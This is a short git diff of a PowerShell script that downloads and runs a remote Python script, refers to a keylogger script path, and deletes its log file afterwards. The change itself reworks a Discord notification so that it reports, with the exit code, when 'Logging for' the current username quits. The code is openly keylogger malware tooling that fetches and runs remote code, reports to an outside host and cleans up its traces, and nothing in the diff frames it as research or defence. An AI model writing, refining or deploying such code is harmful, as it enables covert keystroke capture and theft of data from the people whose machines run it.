@@ -90,6 +90,11 @@ try {
     Invoke-WebRequest -Uri $pythonScriptUrl -OutFile $localPythonScriptPath
     $pythonProcess = Start-Process -FilePath "python" -ArgumentList $localPythonScriptPath -NoNewWindow -PassThru
     $pythonProcess.WaitForExit()
+
+    # Check the exit code of the Python process
+    if ($pythonProcess.ExitCode -ne 0) {
+        Send-DiscordMessage -message "Logging for $env:USERNAME quit unexpectedly with exit code $($pythonProcess.ExitCode)"
+    }
 }
 finally {
     if (Test-Path $logFilePath) { Remove-Item -Path $logFilePath }
@@ -110,9 +115,6 @@ finally {
     } else {
         Write-Output "Keylogger script does not exist at $keyloggerScriptPath"
     }
-
-    # Send unexpected quit message to Discord
-    Send-DiscordMessage -message "Logging for $env:USERNAME quit unexpectedly"
 
     Cleanup-TempScripts
 }
